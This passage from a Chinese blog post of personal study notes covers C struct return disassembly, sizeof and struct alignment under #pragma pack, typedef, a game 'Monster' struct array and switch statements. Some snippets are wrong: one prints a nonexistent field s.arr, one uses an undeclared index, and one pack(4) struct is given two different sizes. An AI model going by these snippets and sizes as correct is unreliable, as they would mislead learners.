class=\"line\">00401078 89 55 EC             mov         dword ptr [ebp-14h],edx</span><br><span class=\"line\">0040107B 8B 45 E0             mov         eax,dword ptr [ebp-20h]</span><br><span class=\"line\">0040107E 89 45 F0             mov         dword ptr [ebp-10h],eax</span><br><span class=\"line\">00401081 8B 4D E4             mov         ecx,dword ptr [ebp-1Ch]</span><br><span class=\"line\">00401084 89 4D F4             mov         dword ptr [ebp-0Ch],ecx</span><br><span class=\"line\">00401087 8B 55 E8             mov         edx,dword ptr [ebp-18h]</span><br><span class=\"line\">0040108A 89 55 F8             mov         dword ptr [ebp-8],edx</span><br><span class=\"line\">0040108D 8B 45 EC             mov         eax,dword ptr [ebp-14h]</span><br><span class=\"line\">00401090 89 45 FC             mov         dword ptr [ebp-4],eax</span><br><span class=\"line\">00401093 33 C0                xor         eax,eax</span><br><span class=\"line\">00401095 5F                   pop         edi</span><br><span class=\"line\">00401096 5E                   pop         esi</span><br><span class=\"line\">00401097 5B                   pop         ebx</span><br><span class=\"line\">00401098 83 C4 70             add         esp,70h</span><br><span class=\"line\">0040109B 3B EC                cmp         ebp,esp</span><br><span class=\"line\">0040109D E8 CE 00 00 00       call        __chkesp (00401170)</span><br><span class=\"line\">004010A2 8B E5                mov         esp,ebp</span><br><span class=\"line\">004010A4 5D                   pop         ebp</span><br><span class=\"line\">004010A5 C3                   ret</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">004106F0 55                   push        ebp</span><br><span class=\"line\">004106F1 8B EC                mov         ebp,esp</span><br><span class=\"line\">004106F3 83 EC 50             sub         esp,50h</span><br><span class=\"line\">004106F6 53                   push        ebx</span><br><span class=\"line\">004106F7 56                   push        esi</span><br><span class=\"line\">004106F8 57                   push        edi</span><br><span class=\"line\">004106F9 8D 7D B0             lea         edi,[ebp-50h]</span><br><span class=\"line\">004106FC B9 14 00 00 00       mov         ecx,14h</span><br><span class=\"line\">00410701 B8 CC CC CC CC       mov         eax,0CCCCCCCCh</span><br><span class=\"line\">00410706 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\">00410708 C7 45 F0 01 00 00 00 mov         dword ptr [ebp-10h],1</span><br><span class=\"line\">0041070F 66 C7 45 F4 02 00    mov         word ptr [ebp-0Ch],offset func+23h (00410713)</span><br><span class=\"line\">00410715 C6 45 F6 03          mov         byte ptr [ebp-0Ah],3</span><br><span class=\"line\">00410719 C7 45 F8 04 00 00 00 mov         dword ptr [ebp-8],4</span><br><span class=\"line\">00410720 C7 45 FC 05 00 00 00 mov         dword ptr [ebp-4],5</span><br><span class=\"line\"></span><br><span class=\"line\">00410727 8B 45 08             mov         eax,dword ptr [ebp+8]</span><br><span class=\"line\">0041072A 8B 4D F0             mov         ecx,dword ptr [ebp-10h]</span><br><span class=\"line\">0041072D 89 08                mov         dword ptr [eax],ecx</span><br><span class=\"line\">0041072F 8B 55 F4             mov         edx,dword ptr [ebp-0Ch]</span><br><span class=\"line\">00410732 89 50 04             mov         dword ptr [eax+4],edx</span><br><span class=\"line\">00410735 8B 4D F8             mov         ecx,dword ptr [ebp-8]</span><br><span class=\"line\">00410738 89 48 08             mov         dword ptr [eax+8],ecx</span><br><span class=\"line\">0041073B 8B 55 FC             mov         edx,dword ptr [ebp-4]</span><br><span class=\"line\">0041073E 89 50 0C             mov         dword ptr [eax+0Ch],edx</span><br><span class=\"line\">00410741 8B 45 08             mov         eax,dword ptr [ebp+8]</span><br><span class=\"line\"></span><br><span class=\"line\">00410744 5F                   pop         edi</span><br><span class=\"line\">00410745 5E                   pop         esi</span><br><span class=\"line\">00410746 5B                   pop         ebx</span><br><span class=\"line\">00410747 8B E5                mov         esp,ebp</span><br><span class=\"line\">00410749 5D                   pop         ebp</span><br><span class=\"line\">0041074A C3                   ret</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>总结：如果不用指针，别声明结构体为局部变量，别把结构体当做返回值和参数</p>\n<hr>\n<p>sizeof</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sizeof(char);</span><br><span class=\"line\"></span><br><span class=\"line\">char arr1[10]</span><br><span class=\"line\">short arr2[10]   //20</span><br><span class=\"line\">int arr3[10]     //40</span><br><span class=\"line\"></span><br><span class=\"line\">sizeof(arr1)     //10</span><br><span class=\"line\">sizeof(arr1[10])   //1</span><br><span class=\"line\"></span><br><span class=\"line\">struct s1</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar a;</span><br><span class=\"line\">\tint b;</span><br><span class=\"line\">\tchar c;</span><br><span class=\"line\">&#125;;   //12</span><br><span class=\"line\">a 0 0 0</span><br><span class=\"line\">b b b b</span><br><span class=\"line\">c 0 0 0</span><br><span class=\"line\">struct s2</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint c;</span><br><span class=\"line\">\tchar a;</span><br><span class=\"line\">\tchar b;</span><br><span class=\"line\">&#125;;   //8</span><br><span class=\"line\">c c c c</span><br><span class=\"line\">a b 0 0</span><br><span class=\"line\"></span><br><span class=\"line\">sizeof(s1);    //12</span><br><span class=\"line\">sizeof(s2);    //8</span><br><span class=\"line\"></span><br><span class=\"line\">对齐参数：结构体中参数以几字节对齐,取值1,2,4,8 默认为8</span><br><span class=\"line\">#pragma pack(1)</span><br><span class=\"line\">struct ha</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\t__int64 b;</span><br><span class=\"line\">\tchar c;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">#pragma pack()</span><br><span class=\"line\">sizeof(ha)   //13</span><br><span class=\"line\"></span><br><span class=\"line\">如果这个值比结构体成员的sizeof值小，那么该成员的偏移量应该以此值为准，即是说，结构体成员的偏移量应该取二者的最小值.</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma pack(2)</span><br><span class=\"line\">struct ha</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\t__int64 b;</span><br><span class=\"line\">\tchar c;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">#pragma pack()</span><br><span class=\"line\">sizeof(ha)   //14</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma pack(4)</span><br><span class=\"line\">struct ha</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\t__int64 b;</span><br><span class=\"line\">\tchar c;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">#pragma pack()</span><br><span class=\"line\">sizeof(ha)   //16</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma pack(4)</span><br><span class=\"line\">struct ha</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\t__int64 b;</span><br><span class=\"line\">\tchar c;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">#pragma pack()</span><br><span class=\"line\">sizeof(ha)   //24</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122135557244.png\" alt=\"image-20230122135557244\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122140313752.png\" alt=\"image-20230122140313752\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122140354031.png\" alt=\"image-20230122140354031\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">对齐原则</span><br><span class=\"line\">原则一:数据成员对齐规则。结构的数据成员，第一个数据成员放在offset为0的地方，以后每个数据成员存储的起始位置要从该成员大小的整数倍开始(比如int在32位机为4字节，则要从4的整数倍地址开始存储).</span><br><span class=\"line\">原则二:结构体的总大小，也就是sizeof的结果，必须是其内部最大成员的整数倍，不足的要补齐。</span><br><span class=\"line\">原则三:如果一个结构里有某些结构体成员，则结构体成员要从其内部最大元素大小的整数倍地址开始存储。(struct a里存有struct b， b里有char，int，double等元素，那b应该从8的整数倍开始存储.)</span><br><span class=\"line\">原则四:对齐参数如果比结构体成员的sizeof值小，该成员的偏移量应该以此值为准.也就是说，结构体成员的偏移量应该取二者的最小值.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122141122230.png\" alt=\"image-20230122141122230\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122142241459.png\" alt=\"image-20230122142241459\"></p>\n<p>取结构体中变量最大的和默认相比，取小的</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122142505891.png\" alt=\"image-20230122142505891\"></p>\n<p><strong>按照数据型由小到大的顺序进行书写</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230122142714801.png\" alt=\"image-20230122142714801\"></p>\n<p>嵌套结构体按照嵌套的结构体中变量最大的是对齐宽度，但结构体还是按照原来大小累加</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct S1</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t//16</span><br><span class=\"line\">\tchar c;</span><br><span class=\"line\">\tdouble i;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">struct S3</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t//32</span><br><span class=\"line\">\tchar c1;</span><br><span class=\"line\">\tS1 s;</span><br><span class=\"line\">\tchar c2;</span><br><span class=\"line\">\tchar c3;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">struct S4</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t//40</span><br><span class=\"line\">\tchar c1;</span><br><span class=\"line\">\tS1 s;</span><br><span class=\"line\">\tchar c2;</span><br><span class=\"line\">\tdouble c3;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">struct S5</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t//16</span><br><span class=\"line\">\tint c1;</span><br><span class=\"line\">\tchar c2[10];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;%d %d %d %d %d\\n&quot;,sizeof(S1),sizeof(S3),sizeof(S4),sizeof(S5),sizeof(1));</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"typedef\"><a class=\"markdownIt-Anchor\" href=\"#typedef\">#</a> typedef</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typedef为C语言的关键字，作用是为一种数据类型定义一个新名字。这里的数据类型包括内部数据类型(int, char等)和自定</span><br><span class=\"line\"></span><br><span class=\"line\">typedef unsigned char BYTE;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef int vector[10];</span><br><span class=\"line\">vector v;</span><br><span class=\"line\">v[0] = 1;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct student</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar a[10];</span><br><span class=\"line\">&#125;stu;</span><br><span class=\"line\">main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tstu s;</span><br><span class=\"line\">\ts.a[0] = &#x27;a&#x27;;</span><br><span class=\"line\">\ts.a[1] = &#x27;b&#x27;;</span><br><span class=\"line\">\ts.a[2] = &#x27;c&#x27;;</span><br><span class=\"line\">\ts.a[3] = &#x27;\\0&#x27;;  //s.a[3] = 0;   \\0和0都是结束符号</span><br><span class=\"line\">\tprintf(&quot;%s&quot;,s.arr);    //abc</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">stu 是 student结构体的别名，两个都可以使用</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#include &quot;string.h&quot;</span><br><span class=\"line\">strcpy(s.arr,&quot;china&quot;);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">nPos</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">float</span> x;</span><br><span class=\"line\">\t<span class=\"type\">float</span> y;</span><br><span class=\"line\">\t<span class=\"type\">float</span> z;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">Monster</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> id;</span><br><span class=\"line\">\t<span class=\"type\">char</span> name[<span class=\"number\">32</span>];</span><br><span class=\"line\">\t<span class=\"type\">int</span> Hp;</span><br><span class=\"line\">\t<span class=\"type\">int</span> blue;</span><br><span class=\"line\">\tnPos pos;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">Monster mon[<span class=\"number\">10</span>];   <span class=\"comment\">//结构体数组</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">value</span><span class=\"params\">(<span class=\"type\">int</span> n,<span class=\"type\">char</span> *name,<span class=\"type\">int</span> hp,<span class=\"type\">int</span> blue, <span class=\"type\">float</span> x,<span class=\"type\">float</span> y,<span class=\"type\">float</span> z)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tmon[i].name = name;</span><br><span class=\"line\">\tmon[i].pos.x = x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">find</span><span class=\"params\">(<span class=\"type\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;=<span class=\"number\">9</span>;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (mon[i].id == x)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"switch\"><a class=\"markdownIt-Anchor\" href=\"#switch\">#</a> Switch</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230123104349398.png\" alt=\"image-20230123104349398\"></p>\n<p>case 后面必须是常量表达式</p>\n<p>case 后常量表达式的值不能一样</p>\n<p>switch 后面表达式必须为整数</p>\n<p>没有 break 时会顺序向下执行，直到遇到 break</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">func</span><span class=\"params\">(<span class=\"type\">int</span> x)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">switch</span>(x)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;2&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;3&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;4&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;5&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tfunc(<span class=\"number\">2</span>);     <span class=\"comment\">//2</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">----------------------------------------------------------------</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">func</span><span class=\"params\">(<span class=\"type\">int</span> x)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">switch</span>(x)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;2&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;3&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;4&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;5&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tfunc(<span class=\"number\">2</span>);   <span class=\"comment\">//234</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//表达式都不成立执行default，default可以省略但不建议</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>switch 反汇编分析</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span 